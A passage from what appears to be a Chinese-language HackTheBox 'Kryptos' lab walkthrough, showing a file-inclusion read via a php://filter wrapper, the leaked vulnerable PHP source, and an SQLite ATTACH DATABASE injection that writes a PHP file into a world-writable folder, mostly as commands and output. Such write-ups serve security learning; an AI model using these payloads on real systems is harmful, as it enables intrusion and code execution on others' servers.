+<p>用法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos/rc4_decryptor </span><br><span class="line">╰─$ python3 rc4_decryptor.py -h                                                                                                         2 ↵</span><br><span class="line">usage: rc4_decryptor.py [-h] [--port PORT] decrypt_file_url username password attack_ip</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  decrypt_file_url  decrypt_file_url</span><br><span class="line">  username          your username</span><br><span class="line">  password          your password</span><br><span class="line">  attack_ip         your attack ip</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help        show this help message and exit</span><br><span class="line">  --port PORT       your local mysql port</span><br></pre></td></tr></table></figure>
+
+<p>接着我们需要查看两个文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dev&#x2F;index.php?view&#x3D;about</span><br><span class="line">&#x2F;dev&#x2F;index.php?view&#x3D;todo</span><br></pre></td></tr></table></figure>
+
+<p><code>/dev/index.php?view=about</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos/rc4_decryptor </span><br><span class="line">╰─$ python3 rc4_decryptor.py http://127.0.0.1/dev/index.php\?view\=about admin admin 10.10.14.12</span><br><span class="line">[*] Your token is  9de8dee09e6661f47e7f3ecf08730bcd6bb5794c8eb710427c15bcf759e51eee</span><br><span class="line">[*] Login success, the cookies is r7lvmms6lr6adfpdpavikmduif</span><br><span class="line">[*] Get the source file......</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>Main Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=todo"</span>&gt;</span>ToDo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">This is about page</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>/dev/index.php?view=todo</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>Main Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=todo"</span>&gt;</span>ToDo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>ToDo List:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">1) Remove sqlite_test_page.php</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>2) Remove world writable folder which was used for sqlite testing</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>3) Do the needful</span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span> Done: <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">1) Restrict access to /dev</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>2) Disable dangerous PHP functions</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>发现了新文件<code>sqlite_test_page.php</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos/rc4_decryptor </span><br><span class="line">╰─$ python3 rc4_decryptor.py http://127.0.0.1/dev/sqlite_test_page.php admin admin 10.10.14.33</span><br><span class="line">[*] Your token is  c24933e058bd78db4326ad57750ff2ce094feaa3dad9a0368d9094e3044f0db4</span><br><span class="line">[*] Login success, the cookies is t488iuurav9ig63sfd768us44p</span><br><span class="line">[*] Get the source file......</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>直接读取没有读取到<code>sqlite_test_page.php</code>文件的内容，但观察前面的链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;index.php?view&#x3D;about&quot;&gt;About&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;index.php?view&#x3D;todo&quot;&gt;ToDo&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>index.php</code>文件中可能存在任意文件包含漏洞。</p>
+<p>尝试用<code>index.php?view=</code>来读取<code>index.php</code>页面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~&#x2F;Kryptos&#x2F;rc4_decryptor </span><br><span class="line">╰─$ python3 rc4_decryptor.py http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;index.php\?view\&#x3D;..&#x2F;index admin admin 10.10.14.33</span><br><span class="line">[*] Your token is  9e01f2dc073e967f6b6b7a192babdaddd5e83f4c93490dfc3cf52d93c8d01565</span><br><span class="line">[*] Login success, the cookies is 6a0v896m94kgjiihfim2269mgt</span><br><span class="line">[*] Get the source file......</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;menu&quot;&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;index.php&quot;&gt;Main Page&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;index.php?view&#x3D;about&quot;&gt;About&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;index.php?view&#x3D;todo&quot;&gt;ToDo&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Cryptor Login&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;bootstrap.min.css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container-fluid&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">  &lt;h2&gt;Cryptor Login&lt;&#x2F;h2&gt;</span><br><span class="line">  &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">      &lt;label for&#x3D;&quot;Username&quot;&gt;Username:&lt;&#x2F;label&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;form-control&quot; id&#x3D;&quot;username&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;Enter username&quot;&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">      &lt;label for&#x3D;&quot;password&quot;&gt;Password:&lt;&#x2F;label&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; id&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Enter password&quot;&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; id&#x3D;&quot;db&quot; name&#x3D;&quot;db&quot; value&#x3D;&quot;cryptor&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;b579c39d7f0217b10435d21ed8cd117e42dc85d406821f1bb524aa02ff150adc&quot; &#x2F;&gt;</span><br><span class="line">    &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn btn-primary&quot; name&#x3D;&quot;login&quot;&gt;Submit&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功地读取了index.php，从而证实了存在文件包含漏洞的猜想。直接读取sqlite_test_page行不通，可以利用php的stream wrapper来读取：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~&#x2F;Kryptos&#x2F;rc4_decryptor </span><br><span class="line">╰─$ python3 rc4_decryptor.py http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;index.php\?view\&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;sqlite_test_page admin admin 10.10.14.33                                                                                                                        </span><br><span class="line">[*] Your token is  62fc897e5c3c603631045d1aed7ed2ff76bfa9a508859c41213d60eae7a3b34d</span><br><span class="line">[*] Login success, the cookies is jjm61uharj4l3i721lb83kjoiu</span><br><span class="line">[*] Get the source file......</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;menu&quot;&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;index.php&quot;&gt;Main Page&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;index.php?view&#x3D;about&quot;&gt;About&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;index.php?view&#x3D;todo&quot;&gt;ToDo&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">PGh0bWw+CjxoZWFkPjwvaGVhZD4KPGJvZHk+Cjw&#x2F;cGhwCiRub19yZXN1bHRzID0gJF9HRVRbJ25vX3Jlc3VsdHMnXTsKJGJvb2tpZCA9ICRfR0VUWydib29raWQnXTsKJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gYm9va3MgV0hFUkUgaWQ9Ii4kYm9va2lkOwppZiAoaXNzZXQoJGJvb2tpZCkpIHsKICAgY2xhc3MgTXlEQiBleHRlbmRzIFNRTGl0ZTMKICAgewogICAgICBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpCiAgICAgIHsKCSAvLyBUaGlzIGZvbGRlciBpcyB3b3JsZCB3cml0YWJsZSAtIHRvIGJlIGFibGUgdG8gY3JlYXRlL21vZGlmeSBkYXRhYmFzZXMgZnJvbSBQSFAgY29kZQogICAgICAgICAkdGhpcy0+b3BlbignZDllMjhhZmNmMGIyNzRhNWUwNTQyYWJiNjdkYjA3ODQvYm9va3MuZGInKTsKICAgICAgfQogICB9CiAgICRkYiA9IG5ldyBNeURCKCk7CiAgIGlmKCEkZGIpewogICAgICBlY2hvICRkYi0+bGFzdEVycm9yTXNnKCk7CiAgIH0gZWxzZSB7CiAgICAgIGVjaG8gIk9wZW5lZCBkYXRhYmFzZSBzdWNjZXNzZnVsbHlcbiI7CiAgIH0KICAgZWNobyAiUXVlcnkgOiAiLiRxdWVyeS4iXG4iOwoKaWYgKGlzc2V0KCRub19yZXN1bHRzKSkgewogICAkcmV0ID0gJGRiLT5leGVjKCRxdWVyeSk7CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9Cn0KZWxzZQp7CiAgICRyZXQgPSAkZGItPnF1ZXJ5KCRxdWVyeSk7CiAgIHdoaWxlKCRyb3cgPSAkcmV0LT5mZXRjaEFycmF5KFNRTElURTNfQVNTT0MpICl7CiAgICAgIGVjaG8gIk5hbWUgPSAiLiAkcm93WyduYW1lJ10gLiAiXG4iOwogICB9CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9CiAgICRkYi0+Y2xvc2UoKTsKfQp9Cj8+CjwvYm9keT4KPC9odG1sPgo&#x3D;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>base64解码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos/rc4_decryptor </span><br><span class="line">╰─$ <span class="keyword">echo</span> PGh0bWw+CjxoZWFkPjwvaGVhZD4KPGJvZHk+Cjw/cGhwCiRub19yZXN1bHRzID0gJF9HRVRbJ25vX3Jlc3VsdHMnXTsKJGJvb2tpZCA9ICRfR0VUWydib29raWQnXTsKJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gYm9va3MgV0hFUkUgaWQ9Ii4kYm9va2lkOwppZiAoaXNzZXQoJGJvb2tpZCkpIHsKICAgY2xhc3MgTXlEQiBleHRlbmRzIFNRTGl0ZTMKICAgewogICAgICBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpCiAgICAgIHsKCSAvLyBUaGlzIGZvbGRlciBpcyB3b3JsZCB3cml0YWJsZSAtIHRvIGJlIGFibGUgdG8gY3JlYXRlL21vZGlmeSBkYXRhYmFzZXMgZnJvbSBQSFAgY29kZQogICAgICAgICAkdGhpcy0+b3BlbignZDllMjhhZmNmMGIyNzRhNWUwNTQyYWJiNjdkYjA3ODQvYm9va3MuZGInKTsKICAgICAgfQogICB9CiAgICRkYiA9IG5ldyBNeURCKCk7CiAgIGlmKCEkZGIpewogICAgICBlY2hvICRkYi0+bGFzdEVycm9yTXNnKCk7CiAgIH0gZWxzZSB7CiAgICAgIGVjaG8gIk9wZW5lZCBkYXRhYmFzZSBzdWNjZXNzZnVsbHlcbiI7CiAgIH0KICAgZWNobyAiUXVlcnkgOiAiLiRxdWVyeS4iXG4iOwoKaWYgKGlzc2V0KCRub19yZXN1bHRzKSkgewogICAkcmV0ID0gJGRiLT5leGVjKCRxdWVyeSk7CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9Cn0KZWxzZQp7CiAgICRyZXQgPSAkZGItPnF1ZXJ5KCRxdWVyeSk7CiAgIHdoaWxlKCRyb3cgPSAkcmV0LT5mZXRjaEFycmF5KFNRTElURTNfQVNTT0MpICl7CiAgICAgIGVjaG8gIk5hbWUgPSAiLiAkcm93WyduYW1lJ10gLiAiXG4iOwogICB9CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9CiAgICRkYi0+Y2xvc2UoKTsKfQp9Cj8+CjwvYm9keT4KPC9odG1sPgo= | base64 -d</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$no_results = $_GET[<span class="string">'no_results'</span>];</span><br><span class="line">$bookid = $_GET[<span class="string">'bookid'</span>];</span><br><span class="line">$query = <span class="string">"SELECT * FROM books WHERE id="</span>.$bookid;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($bookid)) &#123;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">MyDB</span> <span class="keyword">extends</span> <span class="title">SQLite3</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="comment">// This folder is world writable - to be able to create/modify databases from PHP code</span></span><br><span class="line">         <span class="keyword">$this</span>-&gt;open(<span class="string">'d9e28afcf0b274a5e0542abb67db0784/books.db'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   $db = <span class="keyword">new</span> MyDB();</span><br><span class="line">   <span class="keyword">if</span>(!$db)&#123;</span><br><span class="line">      <span class="keyword">echo</span> $db-&gt;lastErrorMsg();</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Opened database successfully\n"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Query : "</span>.$query.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($no_results)) &#123;</span><br><span class="line">   $ret = $db-&gt;exec($query);</span><br><span class="line">   <span class="keyword">if</span>($ret==<span class="keyword">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error : "</span>.$db-&gt;lastErrorMsg();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   $ret = $db-&gt;query($query);</span><br><span class="line">   <span class="keyword">while</span>($row = $ret-&gt;fetchArray(SQLITE3_ASSOC) )&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Name = "</span>. $row[<span class="string">'name'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>($ret==<span class="keyword">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error : "</span>.$db-&gt;lastErrorMsg();</span><br><span class="line">    &#125;</span><br><span class="line">   $db-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以得到一些信息：</p>
+<ol>
+<li>用户可控的参数有两个：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$no_results = $_GET[<span class="string">'no_results'</span>];</span><br><span class="line">$bookid = $_GET[<span class="string">'bookid'</span>];</span><br></pre></td></tr></table></figure>
+
+<p>其中参数<code>$bookid</code>会被拼接到参数<code>$query</code>中，<code>$query</code>参数会根据参数<code>$no_results</code>的值被传到<code>$db-&gt;exec</code>或是<code>$db-&gt;query</code>函数执行，如果<code>$no_results</code>不为空则执行前者，反之则执行后者。</p>
+<ol start="2">
+<li>目录<code>d9e28afcf0b274a5e0542abb67db0784/books.db</code>是<code>world writable</code>的，如果想上传shell，这是很好的目标。</li>
+</ol>
+<p>先看一下sqlite3的exec函数<a href="https://www.php.net/manual/zh/sqlite3.exec.php" target="_blank" rel="noopener"><code>SQLite3::exec</code></a>：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/33.png" alt="33"></p>
+<p>该函数能够对指定的database执行无结果查询。相比于<code>$db-&gt;query</code>，<code>$db-&gt;qeury</code>更常用于SELECT语句，而<code>$db-&gt;exec</code>更常用于CREATE，DELETE，DROP，INSERT和UPDATE等操作。</p>
+<p>而且搜索sqlite3注入的<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" target="_blank" rel="noopener">payload</a>，发现了<strong>Attach Database</strong>的注入方式：</p>
+<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/34.png" alt="34"></p>
+<p>对应的注入语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#39;d9e28afcf0b274a5e0542abb67db0784&#x2F;evil.php&#39; as evil;</span><br><span class="line">CREATE TABLE evil.pwn2 (dataz text);</span><br><span class="line">INSERT INTO evil.pwn2 (dataz) VALUES (&#39;&lt;?php phpinfo();?&gt;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以通过<code>$db-&gt;exec</code>函数来执行构造的sql语句。</p>
+<p>构造的链接为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;sqlite_test_page.php?no_results&#x3D;1111&amp;bookid&#x3D;1;ATTACH DATABASE &#39;d9e28afcf0b274a5e0542abb67db0784&#x2F;evil.php&#39; as evil; CREATE TABLE evil.pwn1 (dataz text); INSERT INTO evil.pwn1 (dataz) VALUES (&#39;&lt;?php phpinfo();?&gt;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>再进行url编码后得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;sqlite_test_page.php?no_results&#x3D;1111&amp;bookid&#x3D;1%3bATTACH+DATABASE+%27d9e28afcf0b274a5e0542abb67db0784%2fevil.php%27+as+evil%3b+CREATE+TABLE+evil.pwn1+(dataz+text)%3b+INSERT+INTO+evil.pwn1+(dataz)+VALUES+(%27%3c%3fphp+phpinfo()%3b%3f%3e%27)%3b</span><br></pre></td></tr></table></figure>
+
+<p>然后再次通过rc4加密方式简介访问该链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~&#x2F;Kryptos&#x2F;rc4_decryptor </span><br><span class="line">╰─$ python3 rc4_decryptor.py http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;sqlite_test_page.php\?no_results\&#x3D;1111\&amp;bookid\&#x3D;1%3bATTACH+DATABASE+%27d9e28afcf0b274a5e0542abb67db0784%2fevil.php%27+as+evil%3b+CREATE+TABLE+evil.pwn1+\(dataz+text\)%3b+INSERT+INTO+evil.pwn1+\(dataz\)+VALUES+\(%27%3c%3fphp+phpinfo\(\)%3b%3f%3e%27\)%3b  admin admin 10.10.14.33</span><br><span class="line">[*] Your token is  c74c2891ff701de5cdd4d0731c4dc530cabdd8befe1b9e9e430e88f1946a744d</span><br><span class="line">[*] Login success, the cookies is nhvjr1q51cbugevg3go1t9hd56</span><br><span class="line">[*] Get the source file......</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Opened database successfully</span><br><span class="line">Query : SELECT * FROM books WHERE id&#x3D;1;ATTACH DATABASE &#39;d9e28afcf0b274a5e0542abb67db0784&#x2F;evil.php&#39; as evil; CREATE TABLE evil.pwn1 (dataz text); INSERT INTO evil.pwn1 (dataz) VALUES (&#39;&lt;?php phpinfo();?&gt;&#39;);</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
